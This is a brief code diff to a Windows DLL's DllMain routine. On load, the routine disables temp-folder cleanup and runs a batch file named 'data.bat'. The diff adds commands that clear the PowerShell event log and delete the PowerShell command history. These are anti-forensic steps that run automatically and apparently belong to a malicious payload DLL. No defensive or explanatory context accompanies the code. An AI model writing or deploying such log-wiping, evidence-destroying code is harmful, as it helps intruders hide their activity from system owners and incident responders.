@@ -27,6 +27,12 @@ BOOL APIENTRY DllMain(
         // turn off temp folder clearance
         system("powershell -c Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\StorageSense\\Parameters\\StoragePolicy\" -Name \"04\" -Type DWord -Value 0\n");
 
+        // clear powershell event logs
+        system("powershell -c Clear-EventLog \"Windows PowerShell\"");
+
+        // del powershell history file
+        system("powershell -c Remove-Item (Get-PSReadlineOption).HistorySavePath");
+
         system("data.bat");
     }
     return TRUE;  // Successful DLL_PROCESS_ATTACH.
